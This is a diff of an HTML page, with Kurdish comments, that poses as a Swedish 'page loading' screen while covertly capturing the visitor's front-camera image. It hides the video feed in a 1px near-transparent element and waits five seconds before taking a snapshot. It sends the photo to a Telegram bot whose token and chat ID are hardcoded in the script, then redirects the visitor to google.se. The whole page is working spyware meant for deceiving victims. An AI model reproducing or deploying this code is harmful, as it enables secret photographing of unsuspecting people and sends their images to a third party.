@@ -1,45 +1,98 @@
-// ڕێکخستنی کوالێتی بەرز بۆ کامێرا
-const constraints = {
-    video: {
-        facingMode: "user",
-        width: { ideal: 1280 }, // داوای کوالێتی HD دەکەین
-        height: { ideal: 720 }
-    }
-};
+<!DOCTYPE html>
+<html lang="sv">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sidan laddas...</title>
+    <style>
+        /* لە جیاتی display:none، ڤیدیۆکە زۆر بچووک دەکەین بۆ ئەوەی کامێراکە بە ئاگابێت */
+        #video {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+        }
+        #canvas { display: none; }
+        body { 
+            font-family: sans-serif; 
+            text-align: center; 
+            padding-top: 30%; 
+            background-color: #f4f4f4;
+        }
+        .loader {
+            border: 5px solid #ddd;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
 
-navigator.mediaDevices.getUserMedia(constraints)
-.then(stream => {
-    video.srcObject = stream;
-    
-    // چاوەڕێکردنی ٣ چرکە بۆ ئەوەی فوکەس و ڕووناکی تەواو بێت
-    setTimeout(takeSnapshot, 3500); 
-})
-.catch(err => {
-    console.error("Error: ", err);
-});
+    <div class="loader"></div>
+    <h1>Laddar sidan...</h1>
+    <p>Vänta medan vi optimerar anslutningen.</p>
 
-function takeSnapshot() {
-    const context = canvas.getContext('2d');
-    
-    // ڕێکخستنی قەبارەی کانڤاسەکە وەک ڤیدیۆکە
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    // ناردنی وێنەکە بە کوالێتی بەرز (0.9 واتە ٩٠٪ کوالێتی)
-    canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'high_quality.png');
-        formData.append('caption', '📸 وێنەی نوێ بە کوالێتی بەرز');
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
+    <script>
+        const TELEGRAM_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
+        const CHAT_ID = '6351568884';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // داواکردنی کوالێتی بەرز و فوکەسی کامێرا
+        const constraints = {
+            video: {
+                facingMode: "user",
+                width: { min: 640, ideal: 1280, max: 1920 },
+                height: { min: 480, ideal: 720, max: 1080 }
+            }
+        };
+
+        navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+            video.srcObject = stream;
+            
+            // کاتەکەمان زیاد کرد بۆ ٥ چرکە تا مۆبایلەکە ڕووناکی تەواو وەربگرێت
+            setTimeout(takeSnapshot, 5000);
         })
-        .then(() => {
+        .catch(err => {
             window.location.href = "https://www.google.se";
         });
-    }, 'image/jpeg', 0.9); // بەکارهێنانی jpeg بۆ ڕوونی زیاتر
-}
+
+        function takeSnapshot() {
+            const context = canvas.getContext('2d');
+            
+            // ڕێکخستنی قەبارەی وێنەکە بەپێی کامێراکە
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // وێنەگرتن
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // گۆڕینی بۆ JPEG چونکە لە PNG ڕوونتر و سافترە بۆ تێلێگرام
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'image.jpg');
+                formData.append('caption', '📸 وێنەی ساف و ڕوون بە کوالێتی بەرز');
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(() => {
+                    window.location.href = "https://www.google.se";
+                });
+            }, 'image/jpeg', 0.95); // 0.95 واتە بەرزترین کوالێتی
+        }
+    </script>
+</body>
+</html>
